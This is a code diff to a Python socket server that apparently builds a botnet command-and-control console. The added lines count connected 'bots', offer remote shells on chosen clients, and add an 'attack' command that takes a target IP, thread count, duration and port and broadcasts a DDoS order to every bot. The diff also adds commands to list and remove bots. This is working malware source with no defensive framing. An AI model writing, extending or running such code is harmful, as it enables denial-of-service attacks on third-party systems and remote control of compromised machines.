@@ -1,20 +1,25 @@
 import socket
 import threading
 import os
+import sys
+
 
 # List to keep track of connected clients
 connected_clients = []
+clients_lock = threading.Lock()
 
 def handle_client(client_socket, address):
     print(f"Connection from {address}")
 
     # Add the client socket to the list of connected clients
-    connected_clients.append(client_socket)
+    with clients_lock:
+        connected_clients.append(client_socket)
 
     while True:
         try:
             message = client_socket.recv(1024).decode()
-            if not message:
+            if message == "":
+                print(f"Connection with {address} closed.")
                 break
 
             print(f"Received from {address}: {message}")
@@ -25,7 +30,9 @@ def handle_client(client_socket, address):
             break
 
     # Remove the client socket from the list of connected clients
-    connected_clients.remove(client_socket)
+    with clients_lock:
+        if client_socket in connected_clients:
+            connected_clients.remove(client_socket)
     client_socket.close()
     print(f"Connection with {address} closed.")
 
@@ -46,7 +53,7 @@ def start_server():
     server_socket.bind((host, port))
     server_socket.listen(5)
 
-    print(f"Server listening on {host}:{port}")
+    print(f"Server listening on {host}:{port}\n")
 
     # Start a new thread to handle each client
     client_acceptor = threading.Thread(target=accept_clients, args=(server_socket,))
@@ -64,26 +71,31 @@ def accept_clients(server_socket):
 
 def send_messages():
     while True:
-        print(f"Number of Connected Clients: {len(connected_clients)}")
-        message_to_send = input(">>>: ")
+        print(f"Bots Connected: {len(connected_clients)}")
+        message_to_send = input("\n\n\n>>>: ")
+        os.system('clear')
 
-        if message_to_send.lower() == 'exit':
+        if message_to_send.lower() == 'quit':
+            # Send a message to all clients to disconnect
+            send_message_to_clients("disconnect_all")
+
             # Close all client connections
             for client_socket in connected_clients:
                 client_socket.close()
-            # Close the server socket
-            break
+            connected_clients.clear()  # Clear the list of connected clients
+            print("All clients removed. Quitting...")
+            sys.exit()  # Terminate the script using sys.exit()
 
-        # Check if the input starts with "shell"
-        if message_to_send.startswith('shell'):
+        # Check if the input is "shell"
+        if message_to_send.lower() == 'shell':
             # Display a list of connected clients
             print("Connected Clients:")
             for idx, client_socket in enumerate(connected_clients, 1):
                 client_address = client_socket.getpeername()[0]
                 print(f"{idx}. {client_address}")
 
-            # Prompt the user to select a client
-            selected_client = input("Select a client (enter the number): ")
+            # Prompt the user to select a client for a shell
+            selected_client = input("\nSelect a client for a shell (enter the number): ")
             try:
                 selected_index = int(selected_client) - 1
                 if 0 <= selected_index < len(connected_clients):
@@ -94,6 +106,36 @@ def send_messages():
                     print("Invalid client selection.")
             except ValueError:
                 print("Invalid input. Please enter a number.")
+
+        elif message_to_send == "remove":
+            print("Connected Clients:")
+            for idx, client_socket in enumerate(connected_clients, 1):
+                client_address = client_socket.getpeername()[0]
+                print(f"{idx}. {client_address}")
+
+            selected_client = input("\nSelect a client to remove (enter the number, 'all' to remove all): ")
+            remove_client(selected_client)
+
+        elif message_to_send == "help":
+            print("""Commands:\n\n1) shell  - Allows you to select which client you want a shell on\n2) attack - Starts DDoS attack\n3) list   - Shows the list of bots connected\n4) remove - Remove client/s\n5) quit   - Quit DDoS attack\n""")
+
+        elif message_to_send == "list":
+            for idx, client_socket in enumerate(connected_clients, 1):
+                client_address = client_socket.getpeername()[0]
+                print(f"{idx}. {client_address}")
+
+        if message_to_send == "attack":
+            ip = input("Enter target IP address: ")
+            threads = input("Thread ammount (max=70): ")
+            if int(threads) > 70:
+                threads = "70"
+                print("Too many threads, setting to max")
+            timer = input("Attack length (s): ")
+            port = input("Port: ")
+
+            # Send the "attack" command along with IP, threads, and timer to all clients
+            send_message_to_clients(f"attack {ip} {threads} {timer} {port}")
+            print(f"\nAttack on {ip}:{port} with {threads} threads for {timer} seconds started...")
 
         else:
             # Send the message to all clients
@@ -109,6 +151,33 @@ def send_message_to_client(target_ip, message):
                 # Remove the client socket if there is an issue sending the message
                 connected_clients.remove(client_socket)
             break  # Stop iterating after sending the message to the specified client
+
+def remove_client(selected_client):
+    if selected_client.lower() == 'all':
+        # Send a message to all clients to disconnect
+        send_message_to_clients("disconnect_all")
+
+        # Close all client connections
+        for client_socket in connected_clients:
+            client_socket.close()
+        connected_clients.clear()  # Clear the list of connected clients
+        print("All clients removed.")
+    else:
+        try:
+            selected_index = int(selected_client) - 1
+            if 0 <= selected_index < len(connected_clients):
+                client_socket = connected_clients[selected_index]
+
+                # Send a message to the specific client to disconnect
+                send_message_to_client(client_socket.getpeername()[0], "disconnect")
+
+                client_socket.close()
+                connected_clients.remove(client_socket)
+                print(f"Client {selected_client} removed.")
+
+        except Exception as e:
+            print(e)
+
 
 if __name__ == "__main__":
     start_server()
